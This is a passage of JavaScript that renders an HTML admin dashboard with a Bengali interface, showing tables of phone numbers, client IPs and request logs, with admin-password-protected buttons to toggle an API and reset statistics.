      ).join("") || \`<tr><td colspan="3">কোনো ডেটা নেই</td></tr>\`;

      document.getElementById("phonesTable").innerHTML = (data.topPhones || []).map(u =>
        \`<tr><td>\${esc(u.phone)}</td><td>\${u.count}</td><td class="\${statusCls(u.lastStatus)}">\${esc(u.lastStatus)}</td></tr>\`
      ).join("") || \`<tr><td colspan="3">কোনো ডেটা নেই</td></tr>\`;

      document.getElementById("clientsTable").innerHTML = (data.clients || []).map(cl =>
        \`<tr><td>\${esc(cl.ip)}</td><td>\${esc(cl.country || "-")}</td><td>\${esc(cl.isp || "-")}</td><td>\${cl.requests}</td><td>\${esc(cl.lastChannel || "-")}</td><td>\${esc(formatTime(cl.lastSeen))}</td></tr>\`
      ).join("") || \`<tr><td colspan="6">কোনো ডেটা নেই</td></tr>\`;

      document.getElementById("logsTable").innerHTML = (data.recentLogs || []).map(l =>
        \`<tr><td>\${esc(formatTime(l.time))}</td><td>\${esc(l.ip)}</td><td>\${esc(l.country || "-")}</td><td>\${esc(l.phone)}</td><td>\${esc(l.channel)}</td><td class="\${statusCls(l.status)}">\${esc(l.status)}</td></tr>\`
      ).join("") || \`<tr><td colspan="6">কোনো লগ নেই</td></tr>\`;
    }

    async function toggleApi() {
      const pass = getPass();
      if (!pass) return alert("Admin password দিন");
      const res = await fetch("/admin/api/toggle", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-admin-password": pass
        },
        body: JSON.stringify({})
      });
      const data = await res.json();
      if (!res.ok) return alert(data.error || "Failed");
      loadStats();
    }

    async function resetStats() {
      const pass = getPass();
      if (!pass) return alert("Admin password দিন");
      if (!confirm("সব স্ট্যাটস ও লগ মুছে ফেলবেন?")) return;
      const res = await fetch("/admin/api/reset", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-admin-password": pass
        },
        body: JSON.stringify({})
      });
      const data = await res.json();
      if (!res.ok) return alert(data.error || "Failed");
      loadStats();
    }

    function statusCls(st) {
      if (st === "STARTED_10X") return "tag-found";
      if (st === "OFFLINE_BLOCKED") return "tag-block";
      return "tag-miss";
    }

    function formatTime(iso) {
      if (!iso) return "-";
      return iso.replace("T", " ").slice(0, 19);
    }

    function esc(str) {
      return String(str).replace(/[&<>"']/g, m => ({
        "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
      }[m]));
    }

    if (savedPass) loadStats();
  </script>
</body>
</html>`;
}
